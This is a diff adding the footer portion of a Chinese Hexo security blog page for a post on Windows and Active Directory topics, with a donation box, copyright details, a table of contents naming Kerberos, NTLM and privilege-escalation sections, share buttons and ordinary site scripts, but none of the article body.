+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫">
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝"></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信"></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/07/19/windows-knowledge/">Windows知识点</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 漏断 的个人博客">漏断</a></p>
+        <p><span>发布时间:</span>2020年07月19日 - 23时55分</p>
+        <p><span>最后更新:</span>2020年07月20日 - 00时04分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/19/windows-knowledge/" title="Windows知识点">http://houwenda.github.io/2020/07/19/windows-knowledge/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://houwenda.github.io/2020/07/19/windows-knowledge/　　作者: 漏断" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2020/04/07/classical-configuration-writing-vulnerability-note/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">经典写配置漏洞笔记</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos"><span class="toc-number">2.</span> <span class="toc-text">Kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REQ"><span class="toc-number">2.1.</span> <span class="toc-text">AS_REQ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP"><span class="toc-number">2.2.</span> <span class="toc-text">AS_REP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TGS-REQ"><span class="toc-number">2.3.</span> <span class="toc-text">TGS_REQ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TGS-REP"><span class="toc-number">2.4.</span> <span class="toc-text">TGS_REP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S4U2"><span class="toc-number">2.5.</span> <span class="toc-text">S4U2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-number">2.6.</span> <span class="toc-text">PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主要攻击方法"><span class="toc-number">2.7.</span> <span class="toc-text">主要攻击方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM"><span class="toc-number">3.</span> <span class="toc-text">NTLM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#type1"><span class="toc-number">3.1.</span> <span class="toc-text">type1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type2"><span class="toc-number">3.2.</span> <span class="toc-text">type2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type3"><span class="toc-number">3.3.</span> <span class="toc-text">type3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主要攻击方法-1"><span class="toc-number">3.4.</span> <span class="toc-text">主要攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#诱导发起NTLM请求"><span class="toc-number">3.5.</span> <span class="toc-text">诱导发起NTLM请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">4.</span> <span class="toc-text">AS_REP Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SYSVOL保存敏感信息"><span class="toc-number">5.</span> <span class="toc-text">SYSVOL保存敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用网络服务"><span class="toc-number">6.</span> <span class="toc-text">常用网络服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WINRM"><span class="toc-number">6.1.</span> <span class="toc-text">WINRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSRPC"><span class="toc-number">6.2.</span> <span class="toc-text">MSRPC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">6.3.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-number">6.4.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetBIOS"><span class="toc-number">6.5.</span> <span class="toc-text">NetBIOS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">7.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内核溢出漏洞"><span class="toc-number">7.1.</span> <span class="toc-text">内核溢出漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置错误"><span class="toc-number">7.2.</span> <span class="toc-text">配置错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#组策略首选项（GPP）"><span class="toc-number">7.3.</span> <span class="toc-text">组策略首选项（GPP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过UAC"><span class="toc-number">7.4.</span> <span class="toc-text">绕过UAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#令牌窃取"><span class="toc-number">7.5.</span> <span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无凭证条件下的欺骗攻击"><span class="toc-number">7.6.</span> <span class="toc-text">无凭证条件下的欺骗攻击</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2020/04/07/classical-configuration-writing-vulnerability-note/" title="下一篇: 经典写配置漏洞笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/windows-knowledge/">Windows知识点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/07/classical-configuration-writing-vulnerability-note/">经典写配置漏洞笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/16/Bugku-Pwn-Walkthrough/">Bugku Pwn Walkthrough</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/22/jinja2-ssti/">Jinja2模板注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/27/cuda-for-nvidia1080ti/">Ubuntu18.04配置CUDA支持（NVIDIA 1080Ti）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/29/docker整理/">docker整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/03/upload-labs-writeup/">upload-labs复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/NUSTCTF2019-notes-of-creating-challenges/">NUSTCTF2019出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/nustctf2019-web-writeup/">NUSTCTF2019 Web题解（部分）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/10/python-basics/">Python基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/">如何用P4wnP1_aloa进行HID攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/21/shell-script-notes/">ShellScript笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/bash-commands-notes/">Bash笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/28/how-to-import-mkv-into-Adobe-Premiere/">如何将mkv视频导入Adobe Premiere</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/08/shell-made-of-symbols/">纯符号shell的学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/nust-ctf-e5-b8-88-e5-82-85-e4-bb-ac-e7-9a-84blogs/">师傅们的blogs</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/php-e6-96-87-e4-bb-b6-e5-92-8c-e7-9b-ae-e5-bd-95-e7-ac-94-e8-ae-b0-e8-a1-a5-e5-85-85/">PHP文件和目录 笔记补充</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/04/how-to-install-sqli-labs-on-windows-10/">How to install sqli-labs on Windows 10</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/02/xamppdvwa-on-windows-10-installation-guide/">XAMPP+DVWA on Windows 10 installation guide</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/vmware-workstation-pro12kali2017-3-e5-ae-89-e8-a3-85-e8-ae-b0-e5-bd-95/">VMware Workstation Pro12+Kali2017.3安装记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/regex-notes/">正则补充</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/php-e7-ac-94-e8-ae-b0/">PHP笔记</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 漏断
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">总浏览量: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 3;
+            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
